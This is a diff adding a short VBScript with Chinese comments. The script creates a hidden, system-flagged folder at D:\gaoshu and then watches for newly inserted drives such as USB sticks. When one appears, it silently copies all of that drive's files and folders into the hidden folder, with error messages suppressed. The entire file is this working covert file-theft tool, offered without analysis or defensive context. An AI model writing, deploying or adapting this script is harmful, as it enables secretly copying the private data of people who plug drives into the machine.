@@ -1,0 +1,28 @@
+ set cmdshell=createobject("wscript.shell")
+cmdshell.run("%comspec% /c  mkdir D:\gaoshu"),1,true
+cmdshell.run("%comspec% /c  attrib +a +s +h +r  D:\gaoshu"),1,true
+
+
+set fso=createobject("scripting.filesystemobject")
+set ws=createobject("wscript.shell")
+Dim pan(26) REM 创建数组
+for i = 0 to 25
+	if fso.driveexists(Chr(i+65)) then
+		pan(i) = 1 REM 没插U盘前的盘符
+	else
+		pan(i) = 0 
+	end if
+next
+on error resume next
+do
+	wscript.sleep 5000
+	for i = 0 to 25
+		if fso.driveexists(Chr(i+65)) And pan(i)=0 then
+			wscript.sleep 2000
+			REM fso.createfolder "D:\gaoshu"
+			fso.copyfile Chr(i+65)+":\*","D:\gaoshu"
+			fso.copyfolder Chr(i+65)+":\*","D:\gaoshu"
+			exit do REM 退出do循环 exit for 退出for循环 Exit Do 将控制权转移到循环所在位置的上一层嵌套循环
+		end if
+	next
+loop
